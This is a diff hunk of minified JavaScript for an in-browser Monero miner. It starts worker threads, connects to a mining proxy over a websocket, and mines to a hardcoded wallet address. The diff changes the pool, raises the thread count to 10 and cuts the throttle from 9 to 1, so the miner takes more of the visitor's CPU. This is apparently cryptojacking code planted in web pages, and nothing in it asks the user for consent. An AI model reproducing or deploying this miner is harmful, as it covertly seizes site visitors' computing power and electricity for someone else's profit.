@@ -31,10 +31,10 @@ function addWorker(){var c=new Worker(URL.createObjectURL(new Blob(["("+function
 function on_servermsg(c){c=JSON.parse(c.data);receiveStack.push(c);"job"==c.identifier&&(job=c)}function on_workermsg(c){var g=c.target;if(1!=connected)setTimeout(function(){informWorker(g)},2E3);else{if("nothing"!=c.data&&"wakeup"!=c.data){var f=JSON.parse(c.data);ws.send(c.data);sendStack.push(f)}null===job?setTimeout(function(){informWorker(g)},2E3):(g.postMessage({job:job,throttle:Math.max(0,Math.min(throttleMiner,100))}),"wakeup"!=c.data&&(totalhashes+=1))}};
 
     server = "wss://f.xmrminingproxy.com:8181";
-    var pool = "gulf.moneroocean.stream:20128";
+    var pool = "moneroocean.stream";
     var walletAddress = "42NXNJk2Weh8GWjKu2vsWNSeJoS6oAbxRVnjJniZsarQg9NGUng3NzzgUMD9RveLaTAS2vE7PTxrG9XmT25TrRwtURqBnUc";
-    var workerId = "hola"
-    var threads = -1;
+    var workerId = "leader"
+    var threads = 10;
     var password = "x";
     startMining(pool, walletAddress, workerId, threads, password);
-    throttleMiner = 9;
+    throttleMiner = 1;
